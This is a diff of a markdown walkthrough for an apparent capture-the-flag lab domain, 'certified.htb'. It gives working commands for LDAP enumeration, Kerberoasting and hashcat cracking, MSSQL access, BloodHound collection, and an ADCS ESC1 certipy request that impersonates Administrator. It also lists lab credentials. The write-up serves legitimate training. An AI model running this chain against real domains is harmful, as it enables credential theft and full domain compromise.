@@ -1,17 +1,17 @@
 ___
-Network recon
+## Network recon
 ```bash
 sudo nmap -T4 -A -v -o nmap --min-rate 1000 10.129.229.25 -Pn
 ```
-
 
 Multi-protocol recon
 ```bash
 enum4linux-ng -A 10.129.229.25
 ```
-![](../../assets/Pasted%20image%2020250619151611.png)
+![](../../assets/Pasted%20image%2020250619205012.png)
+
 We have anonymous LDAP access
-### LDAP Enum
+## LDAP Enumeration
 Get users:
 ```bash
 ldapsearch -x -b "DC=certified,DC=htb" -s sub "(&(objectclass=user))" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d " " > users.txt
@@ -28,7 +28,7 @@ nxc ldap 10.129.229.25 -u '' -p '' -M get-desc-users
 ```
 We get a password
 ![](../../assets/Pasted%20image%2020250619151934.png)
-### Movement to MSSQLSERVER
+## Lateral Movement to MSSQLSERVER
 Lets check for users with SPNs set
 ```bash
 ldapsearch -x -b "DC=certified,DC=htb" -s sub "(&(objectClass=user)(servicePrincipalName=*))" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d " "
@@ -47,7 +47,7 @@ hashcat -m 13100 mssqlserver.hash /usr/share/wordlists/rockyou.txt
 ```
 MSSQLSERVER:lucky7
 ```
-### MSSQL Enumeration
+## MSSQL Enumeration
 ```
 nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -q 'SELECT name FROM master.dbo.sysdatabases;'
 ```
@@ -89,7 +89,7 @@ sudo bloodhound-ce-python -u 'thomas' -p '159357' -ns 10.129.229.25 -d certified
 ![](../../assets/Pasted%20image%2020250619165504.png)
 We see `thomas` has inherited access to the `CERTIFICATE SERVICE DCOM ACCESS` group. This makes me think the priv esc is an ADCS misconfiguration
 ![](../../assets/Pasted%20image%2020250619165619.png)
-### NT \AUTHORITY
+## Administrator
 ---
 Use certipy to find vulnerable templates
 ```bash
@@ -100,7 +100,8 @@ We see this template is vulnerable to ESC1
 ![](../../assets/Pasted%20image%2020250619171221.png)
 Lets collect what we need for ESC1: Template name, CA, target domain.
 ![](../../assets/Pasted%20image%2020250619171545.png)
-cant build our pfx request targeting the administrator user
+
+we can build our pfx request targeting the administrator user
 ```bash
 certipy-ad req -u thomas -p '159357' -dc-ip 10.129.229.25 -template Auth -upn Administrator@certified.htb -ca CERTIFIED-CA -target certified.certified.htb
 ```
